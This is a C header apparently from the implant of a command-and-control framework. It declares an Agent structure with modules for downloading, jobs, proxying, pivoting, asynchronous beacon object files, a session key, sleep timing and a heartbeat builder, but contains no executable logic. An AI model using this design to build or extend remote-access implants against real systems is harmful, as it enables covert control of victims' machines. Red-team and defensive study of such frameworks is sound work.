#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Proxyfire.h"
#include "Pivotter.h"
#include "Commander.h"
#include "Boffer.h"

typedef struct _Commander Commander;
typedef struct _Boffer Boffer;

typedef struct _Agent {
	AgentInfo*		info;
	AgentConfig*    config;
	Commander*      commander;
	Downloader*     downloader;
	JobsController* jober;
	MemorySaver*    memorysaver;
	Proxyfire*		proxyfire;
	Pivotter*       pivotter;
	Boffer*         asyncBofMgr;

	Map<CHAR*, LPVOID> Values;

	BYTE* SessionKey;
	BOOL  Active;
} Agent;

Agent* Agent_Create();
BOOL  Agent_IsActive(Agent* self);
ULONG Agent_GetWorkingSleep(Agent* self);
BYTE* Agent_BuildBeat(Agent* self, ULONG* size);
